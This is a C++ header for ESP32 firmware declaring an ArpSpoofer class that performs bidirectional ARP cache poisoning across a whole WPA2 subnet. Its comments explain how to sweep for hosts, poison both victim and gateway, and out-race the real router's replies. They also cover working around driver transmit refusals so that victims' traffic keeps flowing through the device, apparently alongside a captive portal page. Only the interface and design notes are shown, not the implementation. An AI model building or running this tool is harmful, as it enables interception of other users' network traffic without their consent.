//
// ArpSpoofer — full-subnet ARP cache poisoning over the associated STA link.
//
// Frames are built by hand (Ethernet II + ARP, 42 bytes) and handed to
// esp_wifi_internal_tx(), which is the driver's normal data path: it prepends
// the 802.11 header and applies CCMP, so the AP accepts them like any other
// frame from an associated station. esp_wifi_80211_tx() cannot be used here —
// it injects unencrypted frames, which a WPA2 AP drops.
//
// Poisoning is bidirectional: the victim is told the gateway lives at our MAC
// and the gateway is told the victim lives at our MAC. Without both halves you
// only ever see one direction of the conversation.
//

#pragma once

#include <Arduino.h>
#include <IPAddress.h>
#include <lwip/def.h>   // ntohl/htonl - used inline below, must not depend on include order

class ArpSpoofer {
public:
  // One /24 worth of hosts. Larger subnets are swept up to this many addresses;
  // at 12 bytes per entry the table costs ~3 KB, which is affordable.
  static constexpr int MAX_TARGETS = 254;

  // Ethernet II + ARP for IPv4. Fixed by the protocol.
  static constexpr uint16_t FRAME_LEN = 42;

  struct Target {
    uint32_t ip;        // host byte order
    uint8_t  mac[6];
    bool     used;
  };

  // Snapshots our IP/MAC, the gateway and the subnet. Returns false when not
  // associated or when the subnet is unusable.
  bool begin();
  void end();

  // Discovery — one batch of broadcast ARP requests per call so the sweep is
  // spread across frames instead of blocking the UI.
  void sweepStep();
  bool sweepDone()  const { return _sweepDone; }
  // Re-arms the sweep without clearing the table. A single pass misses hosts
  // that were asleep or slow to answer, and they would otherwise be lost for
  // the whole session.
  void restartSweep() { _sweepIdx = 0; _sweepDone = false; }
  uint32_t sweepProgress() const { return _sweepIdx; }
  uint32_t sweepTotal()    const { return _hostCount; }

  // Fed with every inbound ARP frame seen by the relay, so replies to our
  // sweep (and gratuitous ARP from new hosts) populate the table.
  void observe(const uint8_t* eth, uint16_t len);

  // Fed with the source of every inbound IPv4 frame. Once the broadcast poison
  // starts pulling a host's traffic through us, its own packets identify it —
  // which catches devices that never answered the discovery sweep.
  void observeIpv4(const uint8_t* srcMac, uint32_t srcIp);

  // Asks who owns a local address the relay could not resolve. Rate limited: it
  // is driven by transit traffic, which can be thousands of frames per second
  // for an address nobody answers for.
  void requestResolve(uint32_t ip);

  // Poison — one batch per call; a full round covers every known target.
  void poisonStep();

  // Retries the answers to reachability probes that the driver refused. Must be
  // called from the main loop on every iteration: it paces itself internally and
  // sends at most one frame per call.
  void flushRetries();
  // Send the correct mappings back so victims are not left without a network.
  void restore();

  int  targetCount() const { return _count; }
  bool gatewayKnown() const { return _gwKnown; }

  // ARP frames the driver accepted / refused. Without these a failing
  // esp_wifi_internal_tx() makes the whole attack a silent no-op.
  uint32_t arpSent()   const { return _sent; }
  uint32_t arpFailed() const { return _txFail; }

  // Deferred gateway claims that went out, and ones that never did. The two
  // failures are different problems and must not be read as one: probeLost() is
  // the driver refusing the frame until we gave up, probeDropped() is the queue
  // being full when the answer was raised — the first means TX starvation, the
  // second means too many hosts asking at once.
  uint32_t probeRetried() const { return _probeRetried; }
  uint32_t probeLost()    const { return _probeLost; }
  uint32_t probeDropped() const { return _probeDropped; }

  // Times the router broadcast its own address. Each one corrects every cache
  // on the segment, so a climbing number means we are fighting a gateway that
  // announces itself and the poison will keep flapping.
  uint32_t gatewayAnnounced() const { return _gwAnnounce; }

  uint32_t       selfIp()     const { return _selfIp; }
  const uint8_t* selfMac()    const { return _selfMac; }
  uint32_t       gatewayIp()  const { return _gwIp; }
  const uint8_t* gatewayMac() const { return _gwMac; }

  // Relay lookups.
  // True when the address belongs to our own subnet.
  bool isLocal(uint32_t ip) const { return (ntohl(ip) & _maskH) == _netH; }

  const Target* findByIp(uint32_t ip) const;
  const Target* findByMac(const uint8_t* mac) const;

private:
  // One frame per call, never a burst. The WiFi TX buffers are allocated from
  // the heap, and with a portal page being served there is very little of it
  // left — a burst gets its first frame out and the rest are refused. Measured
  // at batch 2/3: 71% of ARP frames refused while forwarding, on the same
  // driver call, was losing only 2%. The casualties are the answers to a
  // victim's reachability probe, and losing those loses the victim. The totals
  // per second are unchanged; the callers just spread them out.
  static constexpr int SWEEP_BATCH  = 1;   // ARP requests per sweepStep()
  static constexpr int POISON_BATCH = 1;   // targets per poisonStep()

  // The broadcast gateway claim does not need to go out as often as the
  // per-target frames — it exists to catch hosts the sweep never found.
  static constexpr int POISON_BCAST_EVERY = 4;

  // A probe answer is one-shot: the victim asked, and if nothing comes back it
  // falls back to the real gateway a few probes later. The queued copy goes out
  // a moment after the immediate one so it lands after the real router's reply
  // and takes the entry back.
  //
  // The delay and the drain rate are separate on purpose. They used to be one
  // number, which capped the queue at one frame per 25 ms — fine for a single
  // victim, but a second device doubles the ARP volume and the queue simply
  // overflowed. Each slot now carries its own due time, so frames still wait
  // before going out but the queue can empty as fast as it needs to.
  static constexpr int      RETRY_SLOTS    = 16;
  static constexpr uint8_t  RETRY_TRIES    = 12;
  static constexpr uint32_t RETRY_DELAY_MS = 30;  // wait before the copy goes out
  static constexpr uint32_t RETRY_GAP_MS   = 5;   // min spacing between two sends

  // Producer is observe() on the WiFi task, consumer is flushRetries() on the
  // main loop. Single producer, single consumer, one owner per slot: the
  // producer fills the frame and only then marks the slot used, the consumer
  // owns `tries` and is the only one that clears `used`.
  struct Retry {
    uint8_t       frame[FRAME_LEN];
    uint32_t      dueMs;
    uint8_t       tries;
    volatile bool used;
  };
  Retry    _retry[RETRY_SLOTS] = {};
  uint32_t _retryMs      = 0;
  uint32_t _probeRetried = 0;
  uint32_t _probeLost    = 0;
  uint32_t _probeDropped = 0;
  uint32_t _gwAnnounce   = 0;

  Target   _targets[MAX_TARGETS] = {};
  int      _count = 0;

  uint32_t _selfIp = 0;
  uint8_t  _selfMac[6] = {};
  uint32_t _gwIp = 0;
  uint8_t  _gwMac[6] = {};
  bool     _gwKnown = false;

  uint32_t _netBase   = 0;   // first host address
  uint32_t _hostCount = 0;   // usable hosts in the subnet, capped
  uint32_t _netH      = 0;   // network address, host byte order
  uint32_t _maskH     = 0;   // subnet mask, host byte order
  uint32_t _sweepIdx  = 0;
  bool     _sweepDone = false;
  uint32_t _resolveIp = 0;   // last address requestResolve() asked about
  uint32_t _resolveMs = 0;
  int      _poisonIdx   = 0;
  int      _poisonRound = 0;   // counts up to POISON_BCAST_EVERY
  bool     _running     = false;
  uint32_t _sent      = 0;
  uint32_t _txFail    = 0;

  void _sendArp(uint16_t opcode,
                const uint8_t* dstMac, const uint8_t* srcMac,
                const uint8_t* senderMac, uint32_t senderIp,
                const uint8_t* targetMac, uint32_t targetIp);
  // Same frame, but queued for retry when the driver refuses it. For the
  // answers the attack cannot afford to lose.
  void _sendArpReliable(uint16_t opcode,
                        const uint8_t* dstMac, const uint8_t* srcMac,
                        const uint8_t* senderMac, uint32_t senderIp,
                        const uint8_t* targetMac, uint32_t targetIp);
  static void _buildArp(uint8_t* f, uint16_t opcode,
                        const uint8_t* dstMac, const uint8_t* srcMac,
                        const uint8_t* senderMac, uint32_t senderIp,
                        const uint8_t* targetMac, uint32_t targetIp);
  bool _txArp(const uint8_t* frame);
  void _queueRetry(const uint8_t* frame);
  int  _indexOf(uint32_t ip) const;
  void _add(uint32_t ip, const uint8_t* mac);
};
